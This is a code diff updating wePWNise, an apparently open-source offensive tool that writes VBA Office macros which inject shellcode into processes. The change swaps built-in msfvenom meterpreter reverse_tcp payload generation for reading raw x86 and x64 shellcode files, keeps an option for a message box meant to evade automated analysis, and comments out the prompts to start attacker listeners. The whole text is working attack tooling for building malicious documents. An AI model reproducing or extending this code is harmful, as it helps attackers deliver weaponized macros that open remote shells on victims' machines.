@@ -23,7 +23,7 @@ from termcolor import colored
 # You can modify binary-paths.txt to have a list of your own choice :)
 #
  
-version = "0.31 BETA"
+version = "0.32 BETA"
 
 def printBanner():
 
@@ -79,12 +79,10 @@ printBanner()
 print ""
 
 parser = argparse.ArgumentParser(description="wePWNise")
-parser.add_argument("--x64", dest="x64", default="windows/x64/meterpreter/reverse_tcp", help="msfvenom x64 payload")
-parser.add_argument("--x86", dest="x86", default="windows/meterpreter/reverse_tcp", help="msfvenom x86 payload")
-parser.add_argument("lhost64", help="LHOST for x64 to connect/bind to")
-parser.add_argument("lhost86", help="LHOST for x86 to connect/bind to")
-parser.add_argument("lport64", help="LPORT for x64 to connect/bind to")
-parser.add_argument("lport86", help="LPORT for x86 to connect/bind to")
+parser.add_argument("-i86", help="Input X86 RAW shellcode")
+parser.add_argument("-i64", help="Input X64 RAW shellcode")
+
+
 parser.add_argument("--inject64", dest="inject64", default=True, help="Inject into 64 Bit. Set to False for CobaltStrike")
 parser.add_argument("--out", default="wepwnise.txt", help="File to output the VBA macro to")
 parser.add_argument("--msgbox", default=True, dest="msgbox", help="Present messagebox to prevent automated analysis")
@@ -97,7 +95,9 @@ if len(sys.argv) <= 2:
 
 args = parser.parse_args()
 
-xlhost = False
+scReady = False
+
+"""xlhost = False
 xlport = False
 x32bit = False
 x64bit = False
@@ -137,13 +137,21 @@ if validate64bitpayload(args.x64):
 	x64bit = True
 else:
 	print colored("[-] Incorrect X86 PAYLOAD: %s" % args.x64, "red")
+"""
 
 # At this point we know that we have the correct LHOST and LPORT ready for smexiness
 # We also validated our parameters to all be correct
 
-if (not xlhost) or (not xlport) or (not x32bit) or (not x64bit):
-	sys.exit("Invalid parameters, quitting")
+if (args.i64 and args.i86):
+	scReady = True
+
+"""if (not xlhost) or (not xlport) or (not x32bit) or (not x64bit):
+	sys.exit("Invalid parameters, quitting")"""
+
 	# Invalid, do not continue
+if (not scReady):
+	sys.exit("Both x86 and x64 shellcode must be specified")
+
 print ""
 
 print colored("[*] Welcome to wePWNise", "blue")
@@ -151,13 +159,33 @@ print colored("[*] Welcome to wePWNise", "blue")
 print ""
 print colored("[+] Obtaining payloads", "green")
 print colored("\t X86 PAYLOAD", "green")
-pay86 = os.popen("msfvenom -p %s LHOST=%s LPORT=%s -f num" % (args.x86, args.lhost86, args.lport86)).read()
+pay86a = ""
+with open(args.i86, "rb") as f:
+    byte = f.read(1)
+    while byte != "":
+        # Do stuff with byte.
+        byte = f.read(1)
+        if byte:
+         pay86a += hex(ord(byte)) + ","
+pay86a = pay86a[:len(pay86a)-1]
+print pay86a
+#pay86 = os.popen("msfvenom -p %s LHOST=%s LPORT=%s -f num" % (args.x86, args.lhost86, args.lport86)).read()
 print colored("\t X64 PAYLOAD", "green")
-pay64 = os.popen("msfvenom -p %s LHOST=%s LPORT=%s -f num" % (args.x64, args.lhost64, args.lport64)).read()
+pay64a = ""
+with open(args.i64, "rb") as f:
+    byte = f.read(1)
+    while byte != "":
+        # Do stuff with byte.
+        byte = f.read(1)
+        if byte:
+         pay64a += hex(ord(byte)) + ","
+pay64a = pay64a[:len(pay64a)-1]
+print pay64a
+#pay64 = os.popen("msfvenom -p %s LHOST=%s LPORT=%s -f num" % (args.x64, args.lhost64, args.lport64)).read()
 print colored("[+] Payloads obtained successfully", "green")
 print colored("[+] Formatting payloads", "green")
-pay86 = pay86.replace("\r\n", "").split(", ")
-pay64 = pay64.replace("\r\n", "").split(", ")
+pay86 = pay86a.split(",")
+pay64 = pay64a.split(",")
 print colored("[+] Formatting complete", "green")
 
 lines1 = ["Private Const PROCESS_ALL_ACCESS = &H1F0FFF\r\n",
@@ -660,8 +688,8 @@ print colored("[+] Payload written","green")
 
 print ""
 
-print colored("[*] Please start up your x64 listener on %s:%s" % (args.lhost64,args.lport64), "blue")
+"""print colored("[*] Please start up your x64 listener on %s:%s" % (args.lhost64,args.lport64), "blue")
 print colored("[*] Please start up your x86 listener on %s:%s" % (args.lhost86,args.lport86), "blue")
 
 print ""
-
+"""
